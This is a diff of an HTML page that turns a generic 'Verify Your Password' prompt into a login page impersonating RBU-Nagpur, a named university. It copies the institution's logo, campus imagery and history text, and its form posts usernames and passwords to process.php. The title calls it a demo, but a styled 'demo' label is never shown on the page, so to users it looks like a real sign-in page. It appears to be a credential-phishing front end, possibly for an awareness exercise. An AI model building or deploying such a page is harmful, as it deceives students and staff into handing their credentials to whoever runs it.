@@ -1,71 +1,168 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verify Your Password</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f9;
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-        .container {
-            text-align: center;
-            background: #ffffff;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
-        }
-        .container img {
-            max-width: 200px;
-            margin-bottom: 20px;
-        }
-        .container h1 {
-            font-size: 24px;
-            margin-bottom: 10px;
-        }
-        .container p {
-            font-size: 14px;
-            color: #666;
-        }
-        .container form {
-            margin-top: 20px;
-        }
-        .container input {
-            width: 80%;
-            padding: 10px;
-            margin-bottom: 10px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
-        }
-        .container button {
-            padding: 10px 20px;
-            background-color: #007BFF;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-        .container button:hover {
-            background-color: #0056b3;
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>RBU Login Demo</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      min-height: 100vh;
+      background: url("campus.jpg") center center / cover no-repeat;
+      color: white;
+    }
+
+    .page {
+      min-height: 100vh;
+      background: rgba(0, 0, 0, 0.45);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 30px;
+    }
+
+    .main-card {
+      width: 100%;
+      max-width: 1180px;
+      display: grid;
+      grid-template-columns: 2fr 1fr;
+      gap: 28px;
+      background: rgba(0, 0, 0, 0.42);
+      border-radius: 14px;
+      padding: 28px;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.35);
+    }
+
+    .left-panel {
+      padding: 12px;
+    }
+
+    .left-panel .logo {
+      width: 360px;
+      max-width: 100%;
+      margin-bottom: 20px;
+    }
+
+    .left-panel h2 {
+      font-size: 20px;
+      font-weight: normal;
+      margin-bottom: 18px;
+    }
+
+    .left-panel p {
+      font-size: 16px;
+      line-height: 1.7;
+      max-width: 760px;
+    }
+
+    .right-panel {
+      background: rgba(0, 0, 0, 0.58);
+      border-radius: 12px;
+      padding: 28px 22px;
+      align-self: start;
+    }
+
+    .right-panel h3 {
+      font-size: 18px;
+      margin-bottom: 18px;
+    }
+
+    .right-panel input {
+      width: 100%;
+      padding: 14px 16px;
+      margin-bottom: 14px;
+      border: 1px solid #cfcfcf;
+      border-radius: 6px;
+      font-size: 15px;
+      outline: none;
+    }
+
+    .right-panel button {
+      width: 100%;
+      padding: 14px;
+      background: #1477f2;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 18px;
+      cursor: pointer;
+    }
+
+    .right-panel button:hover {
+      background: #0f62ca;
+    }
+
+    .links {
+      margin-top: 18px;
+      text-align: center;
+    }
+
+    .links a {
+      display: block;
+      margin-top: 12px;
+      color: white;
+      text-decoration: none;
+      font-size: 15px;
+    }
+
+    .demo-tag {
+      display: inline-block;
+      background: rgba(255, 170, 0, 0.18);
+      border: 1px solid rgba(255, 170, 0, 0.4);
+      color: #ffd27a;
+      font-size: 13px;
+      padding: 8px 12px;
+      border-radius: 999px;
+      margin-bottom: 16px;
+    }
+
+    @media (max-width: 900px) {
+      .main-card {
+        grid-template-columns: 1fr;
+      }
+
+      .left-panel {
+        padding: 0;
+      }
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <img src="project-x-logo.png" alt="Company Logo">
-        <h1>Verify Your Password</h1>
-        <p>Please verify your username and password to continue.</p>
-        <form method="POST" action="process.php">
-            <input type="text" name="username" placeholder="Username" required><br>
-            <input type="password" name="password" placeholder="Password" required><br>
-            <button type="submit">Verify</button>
+  <div class="page">
+    <div class="main-card">
+      <div class="left-panel">
+        <img src="rbulogo.jpg" alt="RBU Logo" class="logo" />
+        <h2>RBU-Nagpur</h2>
+        <p>
+          RBU (earlier RCOEM) was established in 1984 by Shri Ramdeobaba Sarvajanik Samiti (SRSS),
+          a trust involved in community service for decades. The institute focuses on practical skills,
+          theoretical knowledge, and personality development to support student growth and career readiness.
+        </p>
+      </div>
+
+      <div class="right-panel">
+       
+        <h3>login in to password</h3>
+
+        <form action="process.php" method="POST">
+          <input type="text" name="username" placeholder="Enter username" required />
+          <input type="password" name="password" placeholder="Enter password" required />
+          <button type="submit">Login</button>
         </form>
+
+        <div class="links">
+          <a href="#">Forgot password?</a>
+          <a href="#">Applicant Employee Registration</a>
+          <a href="#">Alumni Registration</a>
+        </div>
+      </div>
     </div>
+  </div>
 </body>
 </html>
